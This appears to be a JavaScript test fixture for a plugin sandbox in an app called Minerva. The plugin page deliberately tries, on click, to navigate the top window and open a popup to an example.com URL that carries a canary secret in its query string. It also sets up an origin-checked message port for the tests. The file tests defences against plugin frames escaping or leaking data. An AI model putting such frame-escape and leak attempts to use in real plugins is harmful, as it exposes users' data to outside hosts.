// A plugin view that tries everything a plugin frame must not do (#2824).
// Each attempt is wired to a click, so it runs with user activation — the
// strongest form a real plugin's attempt could take.
window.scriptRan = true;
const LEAK = 'https://example.com/leak?secret=plugin-frame-canary';
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('top-nav').addEventListener('click', () => {
    try { window.top.location.href = LEAK; } catch (e) { window.topNavError = String(e); }
  });
  document.getElementById('self-nav').addEventListener('click', () => {
    window.location.href = 'other.html';
  });
  document.getElementById('popup').addEventListener('click', () => {
    window.popupResult = String(window.open(LEAK));
  });
});

// The session port (#2825): taken only from the app's own page, as the plugin
// API package will (#2826). `callMinerva` is what the e2e spec drives.
let nextId = 1;
const pending = new Map();
window.addEventListener('message', (e) => {
  if (e.origin !== 'app://minerva' || e.data?.type !== 'minerva.plugin-port' || !e.ports[0]) return;
  window.pluginPort = e.ports[0];
  window.pluginPort.onmessage = (m) => {
    const reply = JSON.parse(m.data);
    pending.get(reply.id)?.(reply);
    pending.delete(reply.id);
  };
});
window.callMinerva = (method, params) => new Promise((resolve) => {
  const id = nextId++;
  pending.set(id, resolve);
  window.pluginPort.postMessage(JSON.stringify({ id, method, params }));
});
